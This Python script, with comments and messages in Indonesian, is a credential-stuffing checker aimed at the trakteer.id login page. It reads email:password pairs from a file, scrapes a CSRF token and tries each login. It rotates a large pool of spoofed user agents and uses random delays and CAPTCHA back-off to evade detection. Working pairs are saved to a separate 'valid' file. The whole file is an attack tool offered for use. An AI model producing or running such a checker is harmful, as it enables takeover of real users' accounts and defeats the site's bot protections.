import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import os
import time
import random

#!/usr/bin/env python3
import subprocess
import sys
import os
import time
import random

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Auto-install dependencies
try:
    import requests
except ImportError:
    print("Module 'requests' tidak ditemukan. Menginstall...")
    install("requests")
    import requests

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("Module 'beautifulsoup4' tidak ditemukan. Menginstall...")
    install("beautifulsoup4")
    from bs4 import BeautifulSoup

try:
    from colorama import Fore, Style, init
except ImportError:
    print("Module 'colorama' tidak ditemukan. Menginstall...")
    install("colorama")
    from colorama import Fore, Style, init


# ===================== KONFIGURASI =====================
init(autoreset=True)
MAX_DELAY = 20
OUTPUT_FILE = "result.txt"
ACCOUNTS_FILE = "acc.txt"
CAPTCHA_COOLDOWN = 30
MAX_RETRIES = 3

# Buat nama file output berdasarkan timestamp
timestamp = time.strftime("%Y%m%d_%H%M%S")
RESULT_FILE = f"result_{timestamp}.txt"
VALID_FILE = f"valid_{timestamp}.txt"
INVALID_FILE = f"invalid_{timestamp}.txt"
ERROR_FILE = f"error_{timestamp}.txt"

# ===================== USER AGENT POOL =====================
USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",

    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
    
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    
    # Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    
    # Rare Browsers
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Vivaldi/6.6.3206.53",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.230.24 Safari/537.36",
    
    # Legacy
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    
    # Random
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
]

def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://trakteer.id/',
        'DNT': str(random.randint(1, 2)),
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin'
    }

def get_csrf_token(session):
    try:
        response = session.get(
            'https://trakteer.id/login',
            headers=get_random_headers(),
            params={'cache_bust': random.randint(100000,999999)},
            timeout=15
        )
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Cari CSRF token di berbagai lokasi
        csrf_token = (
            soup.find('input', {'name': '_token'}) or 
            soup.find('meta', {'name': 'csrf-token'}) or 
            soup.find('meta', {'name': '_token'})
        )
        
        if csrf_token and csrf_token.get('value'):
            return csrf_token['value']
        return None
    except Exception:
        return None

def check_account(email, password):
    with requests.Session() as s:
        try:
            # Dapatkan CSRF token dengan retry
            for _ in range(3):
                csrf_token = get_csrf_token(s)
                if csrf_token:
                    break
                time.sleep(2)
            else:
                return "CSRF_FAILED", "Gagal mendapatkan token"
            
            # Lakukan login
            response = s.post(
                'https://trakteer.id/login',
                headers=get_random_headers(),
                data={
                    '_token': csrf_token,
                    'email': email,
                    'password': password
                },
                allow_redirects=False
            )
            
            # Analisis response
            if response.status_code == 302:
                # Verifikasi dashboard
                dashboard = s.get(
                    'https://trakteer.id/manage/dashboard',
                    headers=get_random_headers(),
                    allow_redirects=False
                )
                if dashboard.status_code == 200:
                    return "VALID", None
                return "INVALID_CREDENTIALS / INACTIVE_ACCOUNT", f"Redirect ke: {dashboard.headers.get('Location', 'unknown')}"
            
            # Parse error message
            soup = BeautifulSoup(response.text, 'html.parser')
            error_div = soup.find('div', {'class': 'block-error'})
            
            if error_div:
                error_text = error_div.get_text(strip=True).lower()
                
                if "email atau password salah" in error_text:
                    return "INVALID_CREDENTIALS", None
                
                if "akun sudah lama tidak aktif" in error_text:
                    return "INACTIVE_ACCOUNT", "Perlu reset password"
                
                if "captcha" in error_text:
                    return "CAPTCHA", None
            
            # Deteksi CAPTCHA visual
            if soup.find('div', class_='g-recaptcha'):
                return "CAPTCHA", None
                
            return "UNKNOWN_ERROR", f"Status code: {response.status_code}"

        except Exception as e:
            return "CONNECTION_ERROR", str(e)

def main():
    # Inisialisasi file output
    with open(RESULT_FILE, 'w') as f:
        f.write("=== HASIL VALIDASI ===\n")
        f.write(f"Tanggal: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    # Membaca akun dari file acc.txt
    try:
        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File '{ACCOUNTS_FILE}' tidak ditemukan!")
        sys.exit(1)
    
    total = len(accounts)
    captcha_count = 0
    valid_accounts = []
    invalid_accounts = []
    
    for idx, (email, password) in enumerate(accounts, 1):
        # Delay dengan pola acak
        delay = random.randint(7, MAX_DELAY) + random.random()
        print(f"{Fore.CYAN}[{idx}/{total}] Menunggu {delay:.1f} detik...")
        time.sleep(delay)
        
        # Proses pengecekan
        start = time.time()
        status, detail = check_account(email, password)
        elapsed = time.time() - start
        
        # Warna status berdasarkan hasil
        color = {
            "VALID": Fore.GREEN,
            "INVALID_CREDENTIALS": Fore.YELLOW,
            "INACTIVE_ACCOUNT": Fore.MAGENTA,
            "CAPTCHA": Fore.RED,
            "CSRF_FAILED": Fore.BLUE,
            "INVALID_CREDENTIALS / INACTIVE_ACCOUNT": Fore.RED
        }.get(status, Fore.WHITE)
        
        output = f"{email} - {status}"
        if detail:
            output += f" ({detail})"
        output += f" [{elapsed:.2f}s]"
        
        print(f"{color}[{idx}/{total}] {output}")
        
        # Tulis ke file hasil
        with open(RESULT_FILE, 'a') as f:
            f.write(f"{output}\n")
        
        # Kelola data valid/invalid untuk summary
        if status == "VALID":
            valid_accounts.append(f"{email}:{password}")
        else:
            invalid_accounts.append(f"{email}:{password}")
        
        # Handle CAPTCHA (jika muncul)
        if status == "CAPTCHA":
            captcha_count += 1
            cooldown = min(300, CAPTCHA_COOLDOWN * (2 ** captcha_count))
            print(f"{Fore.RED}[!] Cooldown {cooldown} detik")
            time.sleep(cooldown)
        else:
            captcha_count = max(0, captcha_count - 1)
    
    # Tulis akun valid ke file terpisah
    if valid_accounts:
        with open(VALID_FILE, 'w') as vf:
            vf.write("=== AKUN VALID ===\n")
            vf.write(f"Tanggal: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for akun in valid_accounts:
                vf.write(akun + "\n")
    
    # Tampilkan summary di CMD
    print("\n" + Fore.GREEN + "===== Proses selesai! =====")
    print(f"Total akun       : {total}")
    print(f"Akun valid       : {len(valid_accounts)}")
    print(f"Akun tidak valid : {len(invalid_accounts)}")
    print(f"\nDetail hasil cek terdapat di file:\n - {RESULT_FILE}\n - Akun valid di file: {VALID_FILE if valid_accounts else 'Tidak ada akun valid'}")

if __name__ == "__main__":
    main()